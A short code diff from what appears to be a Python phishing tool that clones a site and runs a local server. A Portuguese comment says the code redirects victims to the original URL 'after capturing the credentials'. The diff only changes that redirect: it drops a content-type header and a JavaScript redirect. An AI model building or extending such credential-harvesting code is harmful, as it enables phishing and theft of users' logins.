@@ -389,10 +389,9 @@ def run_local_server(clone_dir, target_url, language):
 
                 # Redirecionar para a URL original após capturar as credenciais
                 self.send_response(302)
-                self.send_header('Content-type', 'text/html')
                 self.send_header('Location', target_url)
                 self.end_headers()
-                self.wfile.write(b'<html><body><script>window.location.href="' + target_url.encode() + b'";</script></body></html>')
+               
 
     try:
         # Start the server in a separate thread
